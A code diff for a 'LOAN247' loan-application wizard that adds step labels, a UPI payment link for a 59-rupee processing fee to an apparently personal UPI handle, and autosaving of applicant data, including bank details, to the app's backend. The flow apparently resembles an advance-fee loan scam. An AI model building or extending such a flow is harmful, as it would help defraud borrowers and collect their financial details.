@@ -1,8 +1,8 @@
 "use client";
 
-import { useEffect } from "react";
+import { useEffect, useRef } from "react";
 import { ArrowLeft, ArrowRight, Info } from "lucide-react";
-import { isStepValid, useLoanStore } from "@/lib/loan-store";
+import { getApplicationRef, isStepValid, useLoanStore, validateStep } from "@/lib/loan-store";
 import { ProgressTrack } from "./progress-track";
 import { AppDownloadPrompt } from "./app-download-prompt";
 import { WelcomeStep } from "./steps/welcome-step";
@@ -29,6 +29,33 @@ const STEPS = [
   ApplicationInProcessStep,
 ] as const;
 
+const STEP_LABELS = [
+  "Welcome",
+  "Google login",
+  "Basic info",
+  "CIBIL analysis",
+  "CIBIL report",
+  "Loan amount",
+  "Bank details",
+  "Bank processing",
+  "Processing fee",
+  "Application in process",
+] as const;
+
+const FEE_AMOUNT = 59;
+const UPI_ID = "gulshanyadav62000-6@oksbi";
+
+function getUpiLink(reference: string) {
+  const params = new URLSearchParams({
+    pa: UPI_ID,
+    pn: "LOAN247",
+    am: String(FEE_AMOUNT),
+    cu: "INR",
+    tn: `LOAN247 processing fee ${reference}`,
+  });
+  return `upi://pay?${params.toString()}`;
+}
+
 export function LoanWizard() {
   const step = useLoanStore((s) => s.step);
   const data = useLoanStore((s) => s.data);
@@ -36,6 +63,7 @@ export function LoanWizard() {
   const hydrate = useLoanStore((s) => s.hydrate);
   const goNext = useLoanStore((s) => s.goNext);
   const goBack = useLoanStore((s) => s.goBack);
+  const lastAutosaveKey = useRef("");
 
   // Load any persisted state (returning customer) AFTER mount to avoid SSR
   // hydration mismatches. A returning customer lands on the step they left
@@ -43,6 +71,36 @@ export function LoanWizard() {
   useEffect(() => {
     hydrate();
   }, [hydrate]);
+
+  useEffect(() => {
+    if (!hydrated || step < 2 || validateStep(2, data).length > 0) return;
+
+    const reference = getApplicationRef(data);
+    const autosaveKey = JSON.stringify({ reference, step, data });
+    if (autosaveKey === lastAutosaveKey.current) return;
+
+    const timeout = window.setTimeout(() => {
+      lastAutosaveKey.current = autosaveKey;
+      void fetch("/api/applications", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          reference,
+          paymentStatus: "pending",
+          paymentAmount: FEE_AMOUNT,
+          paymentProvider: "UPI",
+          paymentLink: getUpiLink(reference),
+          lastStep: step,
+          lastStepLabel: STEP_LABELS[step] || "Application started",
+          data,
+        }),
+      });
+    }, 900);
+
+    return () => window.clearTimeout(timeout);
+  }, [data, hydrated, step]);
 
   const CurrentStep = STEPS[step];
   const isFirst = step === 0;
